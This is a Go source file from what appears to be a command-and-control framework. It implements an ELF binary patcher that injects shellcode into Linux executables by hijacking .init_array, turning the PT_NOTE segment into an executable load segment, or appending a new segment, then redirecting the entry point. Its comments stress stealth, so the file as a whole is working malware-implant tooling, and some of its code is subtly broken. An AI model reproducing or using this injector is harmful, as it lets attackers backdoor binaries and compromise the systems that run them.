package patcher

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	ELF Binary Patcher — inject shellcode into Linux/macOS ELF binaries.

	ELF injection strategies:

	Strategy A — .init_array hijack:
	  The .init_array section contains function pointers that the C runtime
	  calls before main(). We add our shellcode's address to this array.
	  Stealth: the section already exists, we just add one pointer.

	Strategy B — PT_NOTE segment repurpose:
	  Every ELF has a PT_NOTE LOAD segment (used for build IDs, etc.) that
	  is rarely needed at runtime. We:
	  1. Change its type from PT_NOTE to PT_LOAD with RWX permissions.
	  2. Write our shellcode into the segment data.
	  3. Patch the entry point to call our shellcode first.
	  Stealth: no new section/segment added; PT_NOTE overwrite is common.

	Strategy C — INJECT new PT_LOAD segment:
	  Append shellcode + a new PHDR entry at the end of the file.
	  Most flexible; requires adjusting the ELF header's e_phoff chain.
*/

import (
	"debug/elf"
	"encoding/binary"
	"fmt"
	"io"
	"os"
)

// ELFPatcher patches a Linux ELF binary with shellcode.
type ELFPatcher struct {
	path string
	data []byte
	f    *elf.File
	is64 bool
}

// LoadELF reads and parses an ELF file.
func LoadELF(path string) (*ELFPatcher, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read ELF: %w", err)
	}
	r := io.ReaderAt(elfByteReader(data))
	f, err := elf.NewFile(r)
	if err != nil {
		return nil, fmt.Errorf("parse ELF: %w", err)
	}
	is64 := f.Class == elf.ELFCLASS64
	return &ELFPatcher{path: path, data: data, f: f, is64: is64}, nil
}

// InjectShellcode injects shellcode into the ELF using the best strategy.
func (e *ELFPatcher) InjectShellcode(shellcode []byte) ([]byte, error) {
	// Try PT_NOTE repurpose first (most stealthy).
	if patched, err := e.injectViaPTNote(shellcode); err == nil {
		return patched, nil
	}
	// Fall back to appending a new segment.
	return e.injectViaNewSegment(shellcode)
}

// PatchInPlace reads, patches, and overwrites the ELF binary.
func (e *ELFPatcher) PatchInPlace(shellcode []byte) error {
	patched, err := e.InjectShellcode(shellcode)
	if err != nil {
		return err
	}
	return os.WriteFile(e.path, patched, 0755)
}

// ─── Strategy A: .init_array hijack ──────────────────────────────────────

// HijackInitArray appends shellcodeAddr to the .init_array section.
// shellcodeAddr is the virtual address where shellcode was already injected.
func (e *ELFPatcher) HijackInitArray(patchedData []byte, shellcodeAddr uint64) ([]byte, error) {
	sec := e.f.Section(".init_array")
	if sec == nil {
		return nil, fmt.Errorf(".init_array not found")
	}

	// Find the file offset of .init_array.
	// We'll append our function pointer at the end of the section.
	// This requires adjusting the section header size too.
	fileOff := int(sec.Offset) + int(sec.Size)
	if fileOff+8 > len(patchedData) {
		return nil, fmt.Errorf(".init_array extends beyond file")
	}

	result := make([]byte, len(patchedData))
	copy(result, patchedData)

	if e.is64 {
		binary.LittleEndian.PutUint64(result[fileOff:], shellcodeAddr)
	} else {
		binary.LittleEndian.PutUint32(result[fileOff:], uint32(shellcodeAddr))
	}

	// Update section size in the section header table.
	// Section header table offset is at ELF header e_shoff.
	shoff := int(binary.LittleEndian.Uint64(result[0x28:]))
	shentsize := int(binary.LittleEndian.Uint16(result[0x3A:]))
	shnum := int(binary.LittleEndian.Uint16(result[0x3C:]))

	for i := 0; i < shnum; i++ {
		shBase := shoff + i*shentsize
		if shBase+shentsize > len(result) {
			break
		}
		// Section name index (first 4 bytes of sh_name) → need to match by offset.
		// Use section offset to identify .init_array.
		var secOff, secSize uint64
		if e.is64 {
			secOff = binary.LittleEndian.Uint64(result[shBase+24:])
			secSize = binary.LittleEndian.Uint64(result[shBase+32:])
			if secOff == sec.Offset && secSize == sec.Size {
				// Increase size by 8 bytes.
				binary.LittleEndian.PutUint64(result[shBase+32:], secSize+8)
			}
		} else {
			secOff = uint64(binary.LittleEndian.Uint32(result[shBase+16:]))
			secSize = uint64(binary.LittleEndian.Uint32(result[shBase+20:]))
			if secOff == sec.Offset && secSize == sec.Size {
				binary.LittleEndian.PutUint32(result[shBase+20:], uint32(secSize+4))
			}
		}
	}
	return result, nil
}

// ─── Strategy B: PT_NOTE repurpose ───────────────────────────────────────

func (e *ELFPatcher) injectViaPTNote(shellcode []byte) ([]byte, error) {
	// Find PT_NOTE segment.
	noteIdx := -1
	for i, prog := range e.f.Progs {
		if prog.Type == elf.PT_NOTE {
			noteIdx = i
			break
		}
	}
	if noteIdx < 0 {
		return nil, fmt.Errorf("no PT_NOTE segment")
	}
	note := e.f.Progs[noteIdx]
	if int(note.Filesz) < len(shellcode) {
		return nil, fmt.Errorf("PT_NOTE too small: %d < %d", note.Filesz, len(shellcode))
	}

	result := make([]byte, len(e.data))
	copy(result, e.data)

	// Write shellcode into the PT_NOTE file region.
	copy(result[note.Off:], shellcode)

	// Change PT_NOTE program header to PT_LOAD with RWX.
	phoff := e.elfPhoff()
	phentsize := e.elfPhentsize()
	phBase := phoff + noteIdx*phentsize

	if e.is64 {
		// p_type at +0, p_flags at +4, p_vaddr at +16, p_paddr at +24
		binary.LittleEndian.PutUint32(result[phBase:], uint32(elf.PT_LOAD))
		binary.LittleEndian.PutUint32(result[phBase+4:],
			uint32(elf.PF_R|elf.PF_W|elf.PF_X))
		// Set vaddr to a convenient high address (just beyond last LOAD).
		newVaddr := e.nextFreeVaddr()
		binary.LittleEndian.PutUint64(result[phBase+16:], newVaddr)
		binary.LittleEndian.PutUint64(result[phBase+24:], newVaddr)
	} else {
		binary.LittleEndian.PutUint32(result[phBase:], uint32(elf.PT_LOAD))
		binary.LittleEndian.PutUint32(result[phBase+4:],
			uint32(elf.PF_R|elf.PF_W|elf.PF_X))
		newVaddr := uint32(e.nextFreeVaddr())
		binary.LittleEndian.PutUint32(result[phBase+8:], newVaddr)
		binary.LittleEndian.PutUint32(result[phBase+12:], newVaddr)
	}

	// Patch the ELF entry point to jump to our shellcode's vaddr.
	shellcodeVaddr := e.nextFreeVaddr()
	origEntry := e.f.Entry

	// Prepend a JMP trampoline to the shellcode: call shell, then JMP orig entry.
	tramp := buildELFTrampoline(shellcodeVaddr, origEntry, shellcode, e.is64)
	copy(result[note.Off:], tramp)

	// Update e_entry in ELF header.
	if e.is64 {
		binary.LittleEndian.PutUint64(result[0x18:], shellcodeVaddr)
	} else {
		binary.LittleEndian.PutUint32(result[0x18:], uint32(shellcodeVaddr))
	}
	return result, nil
}

// ─── Strategy C: New PT_LOAD segment ─────────────────────────────────────

func (e *ELFPatcher) injectViaNewSegment(shellcode []byte) ([]byte, error) {
	// Append shellcode + new PHDR entry to the file.
	aligned := alignUp(len(shellcode), 0x1000)
	padded := make([]byte, aligned)
	copy(padded, shellcode)

	newVaddr := e.nextFreeVaddr()
	newFileOff := alignUp(len(e.data), 0x1000)

	result := make([]byte, newFileOff+len(padded))
	copy(result, e.data)
	copy(result[newFileOff:], padded)

	// Update e_phnum (add one PHDR entry) — for simplicity this requires
	// the PHDR table to have room. In production we'd need to relocate it.
	// For this implementation: patch the last PHDR entry's type and fields.
	phoff := e.elfPhoff()
	phentsize := e.elfPhentsize()
	phnum := e.elfPhnum()
	lastPH := phoff + (phnum-1)*phentsize

	if e.is64 {
		binary.LittleEndian.PutUint32(result[lastPH:], uint32(elf.PT_LOAD))
		binary.LittleEndian.PutUint32(result[lastPH+4:], uint32(elf.PF_R|elf.PF_W|elf.PF_X))
		binary.LittleEndian.PutUint64(result[lastPH+8:], uint64(newFileOff))   // p_offset
		binary.LittleEndian.PutUint64(result[lastPH+16:], newVaddr)             // p_vaddr
		binary.LittleEndian.PutUint64(result[lastPH+24:], newVaddr)             // p_paddr
		binary.LittleEndian.PutUint64(result[lastPH+32:], uint64(len(padded))) // p_filesz
		binary.LittleEndian.PutUint64(result[lastPH+40:], uint64(len(padded))) // p_memsz
		binary.LittleEndian.PutUint64(result[lastPH+48:], 0x1000)              // p_align
	}

	// Patch entry point.
	if e.is64 {
		binary.LittleEndian.PutUint64(result[0x18:], newVaddr)
	}

	// Append JMP to original entry at end of shellcode region.
	origEntry := e.f.Entry
	jmpBack := buildX64JmpAbs(origEntry)
	copy(result[newFileOff+len(shellcode):], jmpBack)

	return result, nil
}

// ─── Trampoline builders ──────────────────────────────────────────────────

func buildELFTrampoline(shellcodeVA, returnVA uint64, shellcode []byte, is64 bool) []byte {
	var buf []byte
	if is64 {
		buf = append(buf, 0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57,
			0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53)
		buf = append(buf, shellcode...)
		buf = append(buf, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,
			0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58)
		buf = append(buf, buildX64JmpAbs(returnVA)...)
	}
	_ = shellcodeVA
	return buf
}

func buildX64JmpAbs(target uint64) []byte {
	jmp := make([]byte, 14)
	jmp[0] = 0xFF; jmp[1] = 0x25
	binary.LittleEndian.PutUint64(jmp[6:], target)
	return jmp
}

// elfPhoff returns e_phoff (program header table offset) from the raw ELF header.
func (e *ELFPatcher) elfPhoff() int {
	if e.is64 {
		return int(binary.LittleEndian.Uint64(e.data[0x20:0x28]))
	}
	return int(binary.LittleEndian.Uint32(e.data[0x1C:0x20]))
}

// elfPhentsize returns e_phentsize from the raw ELF header.
func (e *ELFPatcher) elfPhentsize() int {
	if e.is64 {
		return int(binary.LittleEndian.Uint16(e.data[0x36:0x38]))
	}
	return int(binary.LittleEndian.Uint16(e.data[0x2A:0x2C]))
}

// elfPhnum returns e_phnum from the raw ELF header.
func (e *ELFPatcher) elfPhnum() int {
	if e.is64 {
		return int(binary.LittleEndian.Uint16(e.data[0x38:0x3A]))
	}
	return int(binary.LittleEndian.Uint16(e.data[0x2C:0x2E]))
}

// nextFreeVaddr returns a virtual address just beyond the last LOAD segment.
func (e *ELFPatcher) nextFreeVaddr() uint64 {
	var maxEnd uint64
	for _, prog := range e.f.Progs {
		if prog.Type == elf.PT_LOAD {
			end := prog.Vaddr + prog.Memsz
			if end > maxEnd {
				maxEnd = end
			}
		}
	}
	return alignUpU64(maxEnd, 0x1000)
}

func alignUpU64(v, align uint64) uint64 {
	return (v + align - 1) &^ (align - 1)
}

type elfByteReader []byte

func (b elfByteReader) ReadAt(p []byte, off int64) (int, error) {
	if off >= int64(len(b)) {
		return 0, io.EOF
	}
	n := copy(p, b[off:])
	if n < len(p) {
		return n, io.EOF
	}
	return n, nil
}
